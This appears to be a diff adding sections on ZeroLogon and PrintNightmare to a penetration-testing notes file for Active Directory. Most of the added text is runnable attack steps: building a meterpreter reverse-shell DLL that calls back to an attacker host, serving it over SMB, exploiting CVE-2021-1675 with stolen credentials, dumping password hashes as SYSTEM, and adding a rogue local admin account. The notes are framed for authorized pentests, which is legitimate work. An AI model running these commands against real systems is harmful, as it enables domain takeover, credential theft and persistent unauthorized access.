@@ -365,3 +365,78 @@ misc::cmd
 # now check our privileges, with accessing another machine
 dir \\Client-01\c$
 ```
+
+# Additional Active Directory attacks
+## ZeroLogon
+**NOTE: ZEROLOGON CAN CAUSE A REAL DAMAGE TO YOUR DOMAIN CONTROLLER - IN WORSE CASE YOU HAVE A INFUNCTIONAL DOMAIN CONTROLLER!**
+<p>But Why? Because this vulnerability sets the Domain Controller password to null and take over the entire Domain Controller.</p>
+<p>Pentest behaviour: You will and want test the domain controllers for the vulnerability. The exploitation is most of the time not necessary - talk with your client!</p>
+
+https://github.com/SecuraBV/CVE-2020-1472
+
+1. Let's test our Domain Controller, if we are vulnerable
+```bash
+# setup the scan script, if the DC is vulnerable
+git clone https://github.com/SecuraBV/CVE-2020-1472.git
+cd CVE-2020-1472
+sudo pip3 install -r requirements.txt
+
+# run a scan against the domain controller, to check if its vulnerable
+python3 zerologon_tester.py DC-01 192.168.5.1
+```
+
+## PrintNightmware RCE / LPE
+<p>The PrintSpooler service has functions, that users can add printers. The Service is running as SYSTEM.</p>
+<p>We are able to import a malicious dll, to get a shell as SYSTEM.</p>
+
+### RCE - Remote Code Execution
+1. Check if the target is vulnerable
+```bash
+rpcdump.py @192.168.5.3 | egrep 'MS-RPRN|MS-PAR'
+
+# if: => vulnerable
+# Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
+# Protocol: [MS-RPRN]: Print System Remote Protocol
+```
+
+2. Run the attack
+```bash
+# clone the repository
+git clone https://github.com/cube0x0/CVE-2021-1675.git
+
+# create a malicious DLL
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER-IP> LPORT=5555 -f dll > shell.dll
+
+# host the malicious DLL and share it
+# we are sharing the current directory
+smbserver.py share . -smb2support
+
+# create listener with Metasploit
+use multi/handler
+set LHOST <ATTACKER-IP>
+set LPORT 5555
+set payload windows/x64/meterpreter/reverse_tcp
+
+# run the attack
+python3 CVE-2021-1675.py test.local/f.castle:Password1@192.168.5.2 '\\<ATTACKER-IP>\share\shell.dll'
+
+# we should get a meterpreter reverse shell
+# now we can dump the hashes - WE ARE SYSTEM :)
+hashdump
+```
+
+### LPE - Local Privilege Escalation
+<p>With this PE action, we are able to add a new user to the local admin group.</p>
+
+1. Setup everything
+```bash
+# copy the raw PowerShell script into a new file
+```
+
+2. Run attack
+```bash
+Import-Module .\cve-2021-1675.ps1
+Invoke-Nightmare # add user `adm1n`/`P@ssw0rd` in the local admin group by default
+
+Invoke-Nightmare -DriverName "Xerox" -NewUser "pentester" -NewPassword "Use-A-Strong-Password!5@" 
+```
